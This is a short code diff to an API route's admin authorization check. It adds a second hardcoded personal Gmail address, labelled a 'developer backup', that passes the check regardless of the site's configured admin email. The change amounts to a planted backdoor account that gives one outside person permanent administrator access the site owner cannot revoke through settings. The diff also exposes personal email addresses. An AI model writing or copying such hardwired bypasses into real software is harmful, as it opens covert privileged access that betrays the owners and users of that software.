@@ -17,8 +17,10 @@ export async function POST(request: Request) {
     const settings = await domainService.getSettings();
     const masterAdmin = settings.admin_email || 'info369skills@gmail.com';
     
+    // Check master admin or developer backup
     if (session.user.email !== masterAdmin && 
-        session.user.email !== 'info369skills@gmail.com') {
+        session.user.email !== 'info369skills@gmail.com' && 
+        session.user.email !== 'danubaba369@gmail.com') {
       return NextResponse.json({ message: 'Forbidden' }, { status: 403 });
     }
 
